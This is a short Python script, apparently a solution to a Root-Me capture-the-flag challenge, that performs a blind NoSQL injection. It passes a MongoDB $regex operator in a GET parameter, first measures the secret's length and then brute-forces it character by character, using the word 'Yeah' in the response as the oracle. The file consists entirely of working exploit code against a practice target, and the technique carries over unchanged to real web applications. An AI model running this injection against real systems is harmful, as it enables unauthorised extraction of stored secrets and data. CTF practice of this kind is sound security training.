from string import * 
import requests
regex = ''
punctuation = "!\"$()+,-/:;<=>@}[]_`{~"
alphabet = list(ascii_lowercase) + list(ascii_uppercase) + list(digits) + list(punctuation) 

r = requests.get(f'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]={regex}')


def exploit(r,longueur):
    l = longueur
    flag = ''
    while len(flag) != l:
        for i in alphabet:
            regex = str(flag + i) + '.{' + str(longueur - 1) + '}'
            r = requests.get(f'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]={regex}')
            print(f"Test : {flag + i}",end="\r")
            if 'Yeah' in r.text:
                flag += i
                longueur -= 1
                if longueur == 0:
                    break
                
    print(f"Flag : {flag}")



def longueur(r):
    number = 0
    while "Yeah" in r.text:
        number +=1 
        regex = '.{' + str(number) + '}'
        r = requests.get(f'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]={regex}')
        print(f"Longueur du flag : {number - 1}",end="\r")
    print(f"Longueur du flag : {number - 1}")
    return number - 1


exploit(r,longueur(r))
